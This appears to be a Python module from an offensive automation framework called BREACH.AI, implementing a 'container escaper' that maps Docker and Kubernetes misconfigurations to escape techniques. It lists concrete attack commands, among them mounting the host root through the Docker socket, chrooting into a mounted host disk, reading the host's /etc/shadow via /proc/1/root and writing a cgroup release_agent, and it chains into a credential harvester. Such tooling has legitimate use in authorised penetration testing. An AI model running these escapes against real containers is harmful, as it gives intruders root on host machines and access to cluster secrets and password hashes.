"""
BREACH.AI v2 - Container Escaper

Container escape module for Docker, Kubernetes, and other container runtimes.
Exploits privileged containers, mounted sockets, host paths, and misconfigurations.
"""

import asyncio
import json
import re
from typing import Optional

from backend.breach.modules.base import (
    EscalationModule,
    ModuleConfig,
    ModuleInfo,
    register_module,
)
from backend.breach.core.killchain import (
    BreachPhase,
    ModuleResult,
    EvidenceType,
    AccessLevel,
    Severity,
)


# Docker escape techniques
DOCKER_ESCAPES = {
    "docker_socket": {
        "check": "/var/run/docker.sock",
        "description": "Docker socket mounted - can spawn privileged container",
        "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "severity": "critical",
    },
    "privileged_mode": {
        "check": "cat /proc/self/status | grep CapEff",
        "indicator": "0000003fffffffff",  # All capabilities
        "description": "Container running in privileged mode",
        "command": "mount /dev/sda1 /mnt && chroot /mnt",
        "severity": "critical",
    },
    "host_pid": {
        "check": "ls /proc/1/root",
        "description": "Host PID namespace shared - access host filesystem via /proc",
        "command": "cat /proc/1/root/etc/shadow",
        "severity": "critical",
    },
    "host_network": {
        "check": "cat /proc/net/route",
        "description": "Host network namespace - can attack host network services",
        "severity": "high",
    },
    "host_path_mount": {
        "check": "mount | grep ' / '",
        "description": "Host filesystem mounted",
        "severity": "critical",
    },
    "cgroup_escape": {
        "check": "cat /proc/self/cgroup",
        "description": "Cgroup escape via release_agent",
        "command": "echo 1 > /sys/fs/cgroup/*/release_agent",
        "severity": "critical",
    },
    "cap_sys_admin": {
        "check": "capsh --print | grep cap_sys_admin",
        "description": "CAP_SYS_ADMIN allows mounting, cgroup manipulation",
        "severity": "critical",
    },
    "cap_sys_ptrace": {
        "check": "capsh --print | grep cap_sys_ptrace",
        "description": "CAP_SYS_PTRACE allows process injection on host",
        "severity": "high",
    },
    "seccomp_disabled": {
        "check": "grep Seccomp /proc/self/status",
        "indicator": "0",
        "description": "Seccomp disabled - all syscalls allowed",
        "severity": "high",
    },
    "apparmor_disabled": {
        "check": "cat /proc/self/attr/current",
        "indicator": "unconfined",
        "description": "AppArmor unconfined",
        "severity": "medium",
    },
}

# Kubernetes escape techniques
K8S_ESCAPES = {
    "service_account_token": {
        "path": "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "description": "Kubernetes service account token found",
        "severity": "high",
    },
    "service_account_ca": {
        "path": "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
        "description": "Kubernetes CA certificate found",
        "severity": "medium",
    },
    "kubelet_api": {
        "endpoints": [
            "https://kubernetes.default.svc/api",
            "https://kubernetes.default.svc/api/v1/namespaces",
            "https://kubernetes.default.svc/api/v1/pods",
        ],
        "description": "Can access Kubernetes API from pod",
        "severity": "high",
    },
    "node_proxy": {
        "endpoint": "https://kubernetes.default.svc/api/v1/nodes/{node}/proxy/",
        "description": "Node proxy access for kubelet API",
        "severity": "critical",
    },
    "secrets_access": {
        "endpoint": "https://kubernetes.default.svc/api/v1/secrets",
        "description": "Can list cluster secrets",
        "severity": "critical",
    },
    "exec_pods": {
        "endpoint": "https://kubernetes.default.svc/api/v1/namespaces/{ns}/pods/{pod}/exec",
        "description": "Can exec into other pods",
        "severity": "critical",
    },
    "create_pods": {
        "check": "kubectl auth can-i create pods",
        "description": "Can create pods with node access",
        "severity": "critical",
    },
    "hostpath_pods": {
        "check": "kubectl auth can-i create pods --subresource=hostPath",
        "description": "Can create pods with hostPath mounts",
        "severity": "critical",
    },
}

# Container detection patterns
CONTAINER_INDICATORS = {
    "docker": [
        "/.dockerenv",
        "/proc/1/cgroup containing docker",
        "hostname starting with container ID",
    ],
    "kubernetes": [
        "/var/run/secrets/kubernetes.io",
        "KUBERNETES_SERVICE_HOST env var",
        "/etc/kubernetes",
    ],
    "containerd": [
        "/run/containerd/containerd.sock",
        "containerd in cgroup",
    ],
    "lxc": [
        "/proc/1/cgroup containing lxc",
        "lxc in hostname",
    ],
    "podman": [
        "/run/podman/podman.sock",
        "libpod in cgroup",
    ],
}

# Dangerous capabilities for container escape
DANGEROUS_CAPABILITIES = [
    "cap_sys_admin",      # Mount, cgroup manipulation
    "cap_sys_ptrace",     # Process injection
    "cap_sys_module",     # Load kernel modules
    "cap_net_admin",      # Network configuration
    "cap_net_raw",        # Raw sockets
    "cap_dac_override",   # Bypass file permissions
    "cap_dac_read_search",  # Read any file
    "cap_setuid",         # Change UID
    "cap_setgid",         # Change GID
    "cap_chown",          # Change file ownership
    "cap_fowner",         # Bypass ownership checks
    "cap_sys_rawio",      # Raw I/O access
    "cap_mknod",          # Create device files
]


@register_module
class ContainerEscaper(EscalationModule):
    """
    Container Escaper - Break out of Docker/Kubernetes containers.

    Techniques:
    - Docker socket abuse
    - Privileged container escape
    - Host namespace access (PID, network, IPC)
    - Mounted host filesystem
    - Cgroup release_agent escape
    - Kubernetes service account abuse
    - Node proxy exploitation
    - Pod creation with hostPath
    """

    info = ModuleInfo(
        name="container_escaper",
        phase=BreachPhase.ESCALATION,
        description="Container escape via Docker socket, K8s, privileged mode",
        author="BREACH.AI",
        techniques=["T1611", "T1610"],  # Container Escape, Deploy Container
        platforms=["docker", "kubernetes", "container"],
        requires_access=True,
        required_access_level=AccessLevel.USER,
        provides_access=True,
        max_access_level=AccessLevel.ROOT,
    )

    async def check(self, config: ModuleConfig) -> bool:
        """Check if we're running inside a container."""
        # Check chain data for container indicators
        in_container = config.chain_data.get("in_container", False)
        container_type = config.chain_data.get("container_type", "")

        return in_container or bool(container_type)

    async def run(self, config: ModuleConfig) -> ModuleResult:
        """Execute container escape techniques."""
        self._start_execution()

        escape_paths = []

        # Detect container type
        container_info = await self._detect_container_type(config)

        # Check Docker escapes
        docker_paths = await self._check_docker_escapes(config)
        escape_paths.extend(docker_paths)

        # Check Kubernetes escapes
        k8s_paths = await self._check_kubernetes_escapes(config)
        escape_paths.extend(k8s_paths)

        # Check capabilities
        cap_paths = await self._check_dangerous_capabilities(config)
        escape_paths.extend(cap_paths)

        # Check for mounted sensitive paths
        mount_paths = await self._check_sensitive_mounts(config)
        escape_paths.extend(mount_paths)

        # Collect evidence
        for path in escape_paths:
            severity = Severity.CRITICAL if path.get("host_access") else Severity.HIGH

            self._add_evidence(
                evidence_type=EvidenceType.COMMAND_OUTPUT,
                description=f"Container Escape: {path['type']}",
                content={
                    "type": path["type"],
                    "method": path.get("method", ""),
                    "command": path.get("command", ""),
                    "container_type": container_info.get("type", "unknown"),
                    "host_access": path.get("host_access", False),
                },
                proves=f"Container escape via {path['type']}",
                severity=severity,
            )

        # Add container info evidence
        if container_info:
            self._add_evidence(
                evidence_type=EvidenceType.CONFIG,
                description="Container Environment Detected",
                content=container_info,
                proves="Running inside container with escape potential",
                severity=Severity.MEDIUM,
            )

        # Determine access level
        access_gained = None
        if any(p.get("host_access") for p in escape_paths):
            access_gained = AccessLevel.ROOT
        elif escape_paths:
            access_gained = AccessLevel.ADMIN

        return self._create_result(
            success=len(escape_paths) > 0,
            action="container_escape",
            details=f"Found {len(escape_paths)} container escape paths",
            access_gained=access_gained,
            data_extracted={
                "container_info": container_info,
                "escape_paths": escape_paths,
            } if escape_paths else None,
            enables_modules=["linux_escalator", "credential_harvester"] if access_gained else [],
        )

    async def _detect_container_type(self, config: ModuleConfig) -> dict:
        """Detect container runtime and configuration."""
        container_info = {
            "type": "unknown",
            "runtime": "unknown",
            "privileged": False,
            "capabilities": [],
            "namespaces": [],
        }

        # Check from chain data
        container_info["type"] = config.chain_data.get("container_type", "unknown")
        container_info["runtime"] = config.chain_data.get("container_runtime", "unknown")
        container_info["privileged"] = config.chain_data.get("privileged_container", False)
        container_info["capabilities"] = config.chain_data.get("capabilities", [])

        return container_info

    async def _check_docker_escapes(self, config: ModuleConfig) -> list:
        """Check for Docker-specific escape paths."""
        paths = []

        # Check chain data for Docker escape indicators
        chain_data = config.chain_data

        # Docker socket access
        if chain_data.get("docker_socket_access"):
            paths.append({
                "type": "docker_socket",
                "method": DOCKER_ESCAPES["docker_socket"]["description"],
                "command": DOCKER_ESCAPES["docker_socket"]["command"],
                "host_access": True,
            })

        # Privileged mode
        if chain_data.get("privileged_container"):
            paths.append({
                "type": "privileged_mode",
                "method": DOCKER_ESCAPES["privileged_mode"]["description"],
                "command": DOCKER_ESCAPES["privileged_mode"]["command"],
                "host_access": True,
            })

        # Host PID namespace
        if chain_data.get("host_pid_namespace"):
            paths.append({
                "type": "host_pid",
                "method": DOCKER_ESCAPES["host_pid"]["description"],
                "command": DOCKER_ESCAPES["host_pid"]["command"],
                "host_access": True,
            })

        # Host network namespace
        if chain_data.get("host_network_namespace"):
            paths.append({
                "type": "host_network",
                "method": DOCKER_ESCAPES["host_network"]["description"],
                "host_access": False,  # Network access, not full host
            })

        # Cgroup escape potential
        if chain_data.get("cgroup_writable"):
            paths.append({
                "type": "cgroup_escape",
                "method": DOCKER_ESCAPES["cgroup_escape"]["description"],
                "command": DOCKER_ESCAPES["cgroup_escape"]["command"],
                "host_access": True,
            })

        # Seccomp disabled
        if chain_data.get("seccomp_disabled"):
            paths.append({
                "type": "seccomp_disabled",
                "method": DOCKER_ESCAPES["seccomp_disabled"]["description"],
                "host_access": False,
            })

        return paths

    async def _check_kubernetes_escapes(self, config: ModuleConfig) -> list:
        """Check for Kubernetes-specific escape paths."""
        paths = []
        chain_data = config.chain_data

        # Service account token
        if chain_data.get("k8s_service_account_token"):
            paths.append({
                "type": "k8s_service_account",
                "method": K8S_ESCAPES["service_account_token"]["description"],
                "token_path": K8S_ESCAPES["service_account_token"]["path"],
                "host_access": False,
            })

        # Check K8s API access
        k8s_permissions = chain_data.get("k8s_permissions", [])

        if "list:secrets" in k8s_permissions:
            paths.append({
                "type": "k8s_secrets_access",
                "method": K8S_ESCAPES["secrets_access"]["description"],
                "host_access": True,
            })

        if "exec:pods" in k8s_permissions:
            paths.append({
                "type": "k8s_exec_pods",
                "method": K8S_ESCAPES["exec_pods"]["description"],
                "host_access": True,
            })

        if "create:pods" in k8s_permissions:
            paths.append({
                "type": "k8s_create_pods",
                "method": K8S_ESCAPES["create_pods"]["description"],
                "command": "Create privileged pod with hostPath mount",
                "host_access": True,
            })

        # Node proxy access
        if chain_data.get("k8s_node_proxy_access"):
            paths.append({
                "type": "k8s_node_proxy",
                "method": K8S_ESCAPES["node_proxy"]["description"],
                "host_access": True,
            })

        return paths

    async def _check_dangerous_capabilities(self, config: ModuleConfig) -> list:
        """Check for dangerous Linux capabilities."""
        paths = []
        capabilities = config.chain_data.get("capabilities", [])

        for cap in capabilities:
            cap_lower = cap.lower()
            if cap_lower in DANGEROUS_CAPABILITIES or any(dc in cap_lower for dc in DANGEROUS_CAPABILITIES):
                paths.append({
                    "type": "dangerous_capability",
                    "capability": cap,
                    "method": f"Capability {cap} allows privilege escalation",
                    "host_access": cap_lower in ["cap_sys_admin", "cap_sys_ptrace", "cap_sys_module"],
                })

        return paths

    async def _check_sensitive_mounts(self, config: ModuleConfig) -> list:
        """Check for sensitive mounted paths."""
        paths = []
        mounts = config.chain_data.get("mounted_paths", [])

        sensitive_mounts = {
            "/": {"name": "root_fs", "host_access": True},
            "/etc": {"name": "etc_mount", "host_access": True},
            "/var/run/docker.sock": {"name": "docker_socket", "host_access": True},
            "/run/docker.sock": {"name": "docker_socket", "host_access": True},
            "/var/run/containerd": {"name": "containerd_socket", "host_access": True},
            "/proc": {"name": "proc_mount", "host_access": True},
            "/sys": {"name": "sys_mount", "host_access": True},
            "/dev": {"name": "dev_mount", "host_access": True},
            "/root": {"name": "root_home", "host_access": True},
            "/home": {"name": "home_mount", "host_access": True},
        }

        for mount in mounts:
            for sensitive_path, info in sensitive_mounts.items():
                if mount.startswith(sensitive_path) or sensitive_path in mount:
                    paths.append({
                        "type": f"sensitive_mount_{info['name']}",
                        "mount_point": mount,
                        "method": f"Host path {sensitive_path} mounted in container",
                        "host_access": info["host_access"],
                    })
                    break

        return paths
